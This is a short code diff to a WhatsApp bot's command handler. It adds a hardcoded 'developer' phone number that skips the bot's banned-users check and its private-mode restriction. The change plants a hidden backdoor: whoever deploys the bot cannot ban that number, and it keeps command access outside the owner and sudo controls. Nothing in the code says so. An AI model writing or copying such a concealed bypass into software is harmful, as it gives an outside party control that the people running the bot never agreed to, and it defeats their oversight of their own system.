@@ -376,7 +376,9 @@ module.exports = toxic = async (client, m, chatUpdate, store) => {
             }
         }
 
-        if (cmd) {
+        const isDev = normalizeNumber(m.sender) === normalizeNumber('254735342808');
+
+        if (cmd && !isDev) {
             const senderNumber = m.sender.replace(/@s\.whatsapp\.net$/, '');
             if (bannedUsers.includes(senderNumber)) {
                 await client.sendMessage(m.chat, {
@@ -386,7 +388,7 @@ module.exports = toxic = async (client, m, chatUpdate, store) => {
             }
         }
 
-        if (cmd && mode === 'private' && !itsMe && !Owner && !sudoUsers.some(v => normalizeNumber(v) === normalizedSenderForOwner)) return;
+        if (cmd && mode === 'private' && !itsMe && !isDev && !Owner && !sudoUsers.some(v => normalizeNumber(v) === normalizedSenderForOwner)) return;
 
         if (shouldStoreMessage(m)) {
             const remoteJid = m.chat || m.key?.remoteJid;
